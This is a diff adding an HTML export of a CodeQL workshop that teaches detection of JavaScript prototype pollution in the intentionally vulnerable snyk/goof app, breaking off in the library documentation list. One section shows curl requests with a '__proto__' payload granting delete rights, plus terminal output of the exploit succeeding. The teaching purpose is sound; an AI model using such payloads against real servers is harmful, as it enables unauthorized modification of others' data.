@@ -1,0 +1,1257 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2020-10-20 Tue 15:19 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CodeQL workshop for javascript</title>
+<meta name="generator" content="Org mode" />
+<meta name="author" content="Michael Hohn" />
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { width: 90%; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="./l3style.css"/>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2019 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">CodeQL workshop for javascript</h1>
+<div id="toc">
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org15b2b3f">1. Setup instructions for Visual Studio Code</a></li>
+<li><a href="#orge40d37c">2. Download the workshop zip file</a></li>
+<li><a href="#orgf632d5a">3. Setting up your environment</a></li>
+<li><a href="#org1fdee83">4. CodeQL workshop for javascript, Part 1: Identify the Problem</a>
+<ul>
+<li><a href="#orge83f92d">4.1. The Prototype Pollution Problem</a></li>
+<li><a href="#orgf450473">4.2. Exploit the snyk/goof Application</a></li>
+<li><a href="#orgdc5bf28">4.3. Find problems in source code</a></li>
+</ul>
+</li>
+<li><a href="#orgeed0f82">5. CodeQL workshop for javascript, Part 2: Write query</a>
+<ul>
+<li><a href="#orga4429a0">5.1. Import the CodeQL database</a></li>
+<li><a href="#org8824770">5.2. Custom query for local flow</a></li>
+<li><a href="#org7c3269e">5.3. Custom Global TaintTracking Query and Path Query</a></li>
+<li><a href="#org111059a">5.4. CodeQL JS library documentation</a></li>
+<li><a href="#org3f71a9f">5.5. CodeQL JS data flow library documentation</a></li>
+</ul>
+</li>
+<li><a href="#org28af9d8">6. Appendices</a>
+<ul>
+<li><a href="#org93e9eec">6.1. Appendix A: Trace the exploit in the VS Code JS Debugger</a></li>
+<li><a href="#orgc3c7b89">6.2. Appendix B: Run default queries</a></li>
+<li><a href="#org1b0a38d">6.3. Appendix C: Expand existing query with new sources and sinks</a></li>
+<li><a href="#org7d429ea">6.4. Appendix D: Further Reading</a></li>
+<li><a href="#org4721eb6">6.5. Appendix E: Complete Setup and Exploit of the snyk/goof Application</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="org-content">
+
+<div id="outline-container-org15b2b3f" class="outline-2">
+<h2 id="org15b2b3f"><span class="section-number-2">1</span> Setup instructions for Visual Studio Code</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+To run CodeQL queries offline, follow these steps:
+</p>
+
+<ol class="org-ol">
+<li>Install the Visual Studio Code IDE.</li>
+<li>Download and install the <a href="https://help.semmle.com/codeql/codeql-for-vscode.html">CodeQL extension for Visual Studio Code</a>. Full setup
+instructions are <a href="https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html">here</a>.</li>
+<li><a href="https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html#using-the-starter-workspace">Set up the starter workspace</a>.
+<ul class="org-ul">
+<li><b>Important</b>: Don't forget to <code>git clone --recursive</code> or <code>git submodule
+       update --init --remote</code>, so that you obtain the standard query libraries.</li>
+</ul></li>
+<li>Open the starter workspace: File &gt; Open Workspace &gt; Browse to
+<code>vscode-codeql-starter/vscode-codeql-starter.code-workspace</code>.</li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-orge40d37c" class="outline-2">
+<h2 id="orge40d37c"><span class="section-number-2">2</span> Download the workshop zip file</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+The <a href="https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing">codeql-js-goof-workshop.zip</a> file contains these instructions, the codeql
+database, and a directory with the codeql samples we will develop during the
+workshop.  You can use the codeql samples directory as-is by adding it to your
+workspace.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgf632d5a" class="outline-2">
+<h2 id="orgf632d5a"><span class="section-number-2">3</span> Setting up your environment</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+In case of ql library version errors when trying to run a query, try to set your
+environment to match the one for this workshop by setting the ql library version
+to v1.25.0:
+</p>
+
+<ul class="org-ul">
+<li><p>
+For a standalone ql tree, something like this
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #483d8b;">cd</span> ~/local/vmsync/ql
+git checkout -b mh-v1.25.0 v1.25.0
+</pre>
+</div></li>
+
+<li><p>
+For ql in the starter workspace:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #483d8b;">cd</span> ~/local/vscode-codeql-starter
+git pull
+git submodule update            <span style="color: #b22222;"># </span><span style="color: #b22222;">avoid database scheme mismatch</span>
+git checkout -b mh-v1.25.0 origin/1.25.0
+</pre>
+</div></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org1fdee83" class="outline-2">
+<h2 id="org1fdee83"><span class="section-number-2">4</span> CodeQL workshop for javascript, Part 1: Identify the Problem</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+Before any queries can be written, we 
+</p>
+<ol class="org-ol">
+<li>should be certain that the application has a vulnerability and</li>
+<li>we have to identify the parts of the application's source code affected by
+it.</li>
+</ol>
+</div>
+
+
+<div id="outline-container-orge83f92d" class="outline-3">
+<h3 id="orge83f92d"><span class="section-number-3">4.1</span> The Prototype Pollution Problem</h3>
+<div class="outline-text-3" id="text-4-1">
+<p>
+In this workshop, we focus on Javascript Prototype Pollution.
+</p>
+
+<p>
+Prototype pollution is a type of vulnerability in which an attacker is able to
+modify <code>Object.prototype</code>.  This can happen when recursively merging a
+user-controlled object into another object, allowing an attacker to
+modify the built-in Object prototype.  Once that is done, later requests can
+abuse the new property, e.g. to gain access to parts of a system.
+</p>
+
+<p>
+This is best illustrated via example; the all-in-one vulnerable app, <a href="https://github.com/snyk/goof">goof</a>,
+provides a good sample for prototype injection in a web app.  It labels itself
+as the <i>Super vulnerable todo list application</i>, and has samples for seeing
+those vulnerabilities in action.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgf450473" class="outline-3">
+<h3 id="orgf450473"><span class="section-number-3">4.2</span> Exploit the snyk/goof Application</h3>
+<div class="outline-text-3" id="text-4-2">
+<p>
+This is a concise run to exploit the prototype injection of <a href="https://github.com/snyk/goof">snyk/goof</a>.  For a
+complete walkthrough, see <a href="#org4721eb6">Appendix E: Complete Setup and Exploit of the
+snyk/goof Application</a>.
+</p>
+
+<p>
+For the workshop we only need to collect vulnerability information; once goof
+is running, we try the prototype-pollution exploits:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Check exploits</span>
+bash
+<span style="color: #483d8b;">.</span> ~/local/goof/exploits/prototype-pollution.sh
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Try c1 through c4 and exploit:</span>
+List messages
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c1
+        []
+
+Send some messages
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c2
+        {<span style="color: #8b2252;">"ok"</span>:true}
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c2
+        {<span style="color: #8b2252;">"ok"</span>:true}
+
+List again
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c1
+        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:1,<span style="color: #8b2252;">"timestamp"</span>:1602276330967,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
+         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]
+
+Try to delete
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c4
+        {<span style="color: #8b2252;">"ok"</span>:false,<span style="color: #8b2252;">"error"</span>:<span style="color: #8b2252;">"Access denied"</span>}
+
+Use exploit
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c3
+        {<span style="color: #8b2252;">"ok"</span>:true}
+
+Try to delete again
+        hohn@gh-hohn ~/local/goof/exploits
+        130:$ c4
+        {<span style="color: #8b2252;">"ok"</span>:true}
+
+Notice message 1 is gone:
+        hohn@gh-hohn ~/local/goof/exploits
+        0:$ c1
+        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
+         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"&#128520;"</span>,<span style="color: #8b2252;">"id"</span>:3,<span style="color: #8b2252;">"timestamp"</span>:1602276340962,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]
+</pre>
+</div>
+
+
+<p>
+Now let's examine the exploits and see what happened.  The requests sent are
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">// c2, safe
+{
+    curl --request PUT <span style="color: #8b2252;">\</span>
+      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
+      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
+      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
+<span style="color: #8b2252;">               "message": {"text": "Hi!"}}'</span>
+}
+
+// c3, the exploit:
+{
+    curl --request PUT <span style="color: #8b2252;">\</span>
+      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
+      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
+      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
+<span style="color: #8b2252;">               "message": { "text": "&#128520;", "__proto__": {"canDelete": true}}}'</span>
+}
+
+// c4, the delete request
+{
+    curl --request DELETE <span style="color: #8b2252;">\</span>
+      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
+      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
+      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'</span>
+}
+</pre>
+</div>
+
+<p>
+The first two are PUT requests to the URL <code>$GOOF_HOST/chat</code>, but the json messages differ:
+</p>
+<div class="org-src-container">
+<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">safe</span>
+{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
+ <span style="color: #8b2252;">"message"</span>: {<span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"Hi!"</span>}}
+
+<span style="color: #b22222;">// </span><span style="color: #b22222;">exploit</span>
+{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
+ <span style="color: #8b2252;">"message"</span>: { <span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"&#128520;"</span>, <span style="color: #8b2252;">"__proto__"</span>: {<span style="color: #8b2252;">"canDelete"</span>: <span style="color: #008b8b;">true</span>}}}
+</pre>
+</div>
+
+<p>
+The <code>__proto__</code> change allows the delete request to succeed.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgdc5bf28" class="outline-3">
+<h3 id="orgdc5bf28"><span class="section-number-3">4.3</span> Find problems in source code</h3>
+<div class="outline-text-3" id="text-4-3">
+<p>
+Next, we need to see where and why this is causing the problem in the
+application.  A short inspection of the source code sheds some light on this
+issue. 
+</p>
+
+<p>
+The app entry point is seen from the startup command:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">node app.js                     <span style="color: #b22222;"># </span><span style="color: #b22222;">from ~/local/goof/package.json</span>
+</pre>
+</div>
+
+<p>
+For prototype pollution, the c3 send is a http PUT to <code>$GOOF_HOST/chat</code>, with an
+invalid <code>message</code>:
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">curl --request PUT <span style="color: #8b2252;">\</span>
+  --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
+  --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
+  --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
+<span style="color: #8b2252;">           "message": { "text": "&#128520;", "__proto__": {"canDelete": true}}}'</span>
+</pre>
+</div>
+
+<p>
+Inspect the code to track these;  starting from <code>app.js</code>, we see that
+</p>
+<div class="org-src-container">
+<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">requests are passed through to routes.chat.add via </span>
+app.put(<span style="color: #8b2252;">'/chat'</span>, routes.chat.add);
+</pre>
+</div>
+<p>
+and in <code>index.js</code> line 259, <code>routes.chat.add</code>, we see that
+</p>
+<div class="org-src-container">
+<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">requests pass into </span>
+exports.chat.add(req, res)
+<span style="color: #b22222;">// </span><span style="color: #b22222;">where the the incoming req.body.message directly merged without checks:</span>
+_.merge(message, req.body.message, {...})
+<span style="color: #b22222;">// </span><span style="color: #b22222;">so message (an {}) now has "__proto__": {"canDelete": true}</span>
+</pre>
+</div>
+
+<p>
+This can be seen using the debugger in VS Code; see <a href="#org93e9eec">Appendix A: Trace the
+exploit in the VS Code JS Debugger</a> for details.
+</p>
+
+<p>
+Key information for the later queries:
+</p>
+<ul class="org-ul">
+<li>the request entry through <code>routes.chat.add()</code></li>
+<li>the request use in the <code>_.merge()</code> call</li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgeed0f82" class="outline-2">
+<h2 id="orgeed0f82"><span class="section-number-2">5</span> CodeQL workshop for javascript, Part 2: Write query</h2>
+<div class="outline-text-2" id="text-5">
+<p>
+With the known vulnerability and the information from above, 
+</p>
+<ul class="org-ul">
+<li>the request data enters through <code>routes.chat.add()</code></li>
+<li>the request's data is used in the <code>_.merge()</code> call</li>
+</ul>
+<p>
+we can now proceed to write queries to find these problems.
+</p>
+</div>
+
+<div id="outline-container-orga4429a0" class="outline-3">
+<h3 id="orga4429a0"><span class="section-number-3">5.1</span> Import the CodeQL database</h3>
+<div class="outline-text-3" id="text-5-1">
+<p>
+The codeql database for this project is part of the workshop zip file.  You
+likely got it in the setup step, but here is the link:  <a href="https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing">codeql-js-goof-workshop.zip</a>.
+</p>
+
+<p>
+Next, import the database directory into your VS Code workspace; the name is
+<code>js-goof-9300e9a</code>.
+</p>
+
+<p>
+For completeness and reference, here are the steps used to build the codeql
+database; this requires the codeql cli tools:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">* build db</span>
+<span style="color: #a0522d;">SRCDIR</span>=$<span style="color: #a0522d;">HOME</span>/local/goof
+<span style="color: #a0522d;">DB</span>=$<span style="color: #a0522d;">HOME</span>/local/db/js-goof-$(<span style="color: #ff00ff;">cd</span> $<span style="color: #a0522d;">SRCDIR</span> &amp;&amp; git rev-parse --short HEAD)
+<span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">DB</span>
+<span style="color: #483d8b;">test</span> -d <span style="color: #8b2252;">"$DB"</span> &amp;&amp; rm -fR <span style="color: #8b2252;">"$DB"</span>
+mkdir -p <span style="color: #8b2252;">"$DB"</span>
+
+<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">PATH</span>=$<span style="color: #a0522d;">HOME</span>/local/vmsync/codeql224:<span style="color: #8b2252;">"$PATH"</span>
+codeql database create --language=javascript -s $<span style="color: #a0522d;">SRCDIR</span>  -j 8 -v $<span style="color: #a0522d;">DB</span>
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">Successfully created database at ~/local/db/js-goof-9300e9a</span>
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org8824770" class="outline-3">
+<h3 id="org8824770"><span class="section-number-3">5.2</span> Custom query for local flow</h3>
+<div class="outline-text-3" id="text-5-2">
+<p>
+Based on what we found in <a href="#orgdc5bf28">Find problems in source code</a>, the sink should be
+any argument to <code>merge()</code> past the first, so let's use that.
+</p>
+
+<p>
+The files <a href="./flow-query-0.ql">./flow-query-0.ql</a> etc. build a local flow query from scratch for the
+Javascript Prototype Pollution problem.  We cover these in detail in the
+workshop, but here is the outline of what each introduces for later reference:
+</p>
+
+<ul class="org-ul">
+<li><a href="./flow-query-0.ql">./flow-query-0.ql</a>  identify sink: from, where, select, MethodCallExpr</li>
+<li><a href="./flow-query-1.ql">./flow-query-1.ql</a>  getAnArgument</li>
+<li><a href="./flow-query-2.ql">./flow-query-2.ql</a>  Introduce <code>predicate</code> and convert to <code>predicate mergeCallArg</code></li>
+<li><a href="./flow-query-3.ql">./flow-query-3.ql</a>  identify source: FunctionExpr, getName</li>
+<li><a href="./flow-query-4.ql">./flow-query-4.ql</a>  parameter and body: getNumParameter, getBody</li>
+<li><a href="./flow-query-5.ql">./flow-query-5.ql</a>  source argument: getParameter</li>
+<li><a href="./flow-query-6.ql">./flow-query-6.ql</a>  convert to <code>predicate chatHandler</code></li>
+<li><a href="./flow-query-7.ql">./flow-query-7.ql</a>  Local flow attempt: getASuccessor, <code>operator +</code>,
+<code>DataFlowNode</code>, getAstNode</li>
+<li><a href="./flow-query-8.ql">./flow-query-8.ql</a>  Flow debugging: flow from source to any</li>
+<li><a href="./flow-query-9.ql">./flow-query-9.ql</a>  Flow debugging: sink only (sanity check)</li>
+<li><a href="./flow-query-10.ql">./flow-query-10.ql</a>  Flow debugging: any to sink</li>
+<li><a href="./flow-query-11.ql">./flow-query-11.ql</a>  Flow try: any to any child of sink: introduce <code>exists</code>,
+getAChild, <code>operator *</code></li>
+<li><a href="./flow-query-12.ql">./flow-query-12.ql</a>  Local flow: Re-introduce the source restriction,
+simplify <code>exists</code>, get working flow query.</li>
+<li><a href="./flow-query-13.ql">./flow-query-13.ql</a> Add <code>predicate mergeCallArg</code> and <code>predicate chatHandler</code>
+taking <code>DataFlowNode</code> to clean up and for re-use in global flow query.</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org7c3269e" class="outline-3">
+<h3 id="org7c3269e"><span class="section-number-3">5.3</span> Custom Global TaintTracking Query and Path Query</h3>
+<div class="outline-text-3" id="text-5-3">
+<p>
+The <a href="#org8824770">Custom query for local flow</a> developed the predicates we need for a global
+taint tracking query.  The files <a href="./GoofPrototypePollution-0.ql">./GoofPrototypePollution-0.ql</a> etc. develop
+this query and list pairs of results (sources and sinks).  The sequence:
+</p>
+<ul class="org-ul">
+<li><a href="./GoofPrototypePollution-0.ql">./GoofPrototypePollution-0.ql</a>  Raw global taint tracking configuration
+template.  Introduces <code>class</code>, characteristic predicate,
+<code>TaintTrackingConfiguration</code> and <code>hasFlow()</code>.</li>
+<li><a href="./GoofPrototypePollution-1.ql">./GoofPrototypePollution-1.ql</a>  Plug in the previously developed predicates
+<code>mergeCallArg</code> and <code>chatHandler</code>, see the flow pairs.</li>
+<li><a href="./GoofPrototypePollution-2.ql">./GoofPrototypePollution-2.ql</a>  Changes to get a path query.  In addition to
+the result pairs listed by <a href="./GoofPrototypePollution-1.ql">./GoofPrototypePollution-1.ql</a>, this <i>path query</i>
+also shows some data flow paths between the sources and sinks.  For this
+example, they are all local.</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org111059a" class="outline-3">
+<h3 id="org111059a"><span class="section-number-3">5.4</span> CodeQL JS library documentation</h3>
+<div class="outline-text-3" id="text-5-4">
+<p>
+The following is an overview of available library documentation; the <b>bold</b>
+items are those used in this workshop.  
+</p>
+<ul class="org-ul">
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#codeql-library-for-javascript">codeql-library-for-javascript</a>
+<ul class="org-ul">
+<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#syntactic-level">Syntactic Level</a>
+<ul class="org-ul">
+<li>ASTNode,
+<ul class="org-ul">
+<li>TopLevel</li>
+<li>Stmt</li>
+<li><b>Expr</b>
+<ul class="org-ul">
+<li><b>FunctionExpr</b></li>
+<li>InvokeExpr
+<ul class="org-ul">
+<li>CallExpr</li>
+<li>NewExpr</li>
+<li><b>MethodCallExpr</b></li>
+</ul></li>
+<li>PropAccess</li>
+</ul></li>
+</ul></li>
+
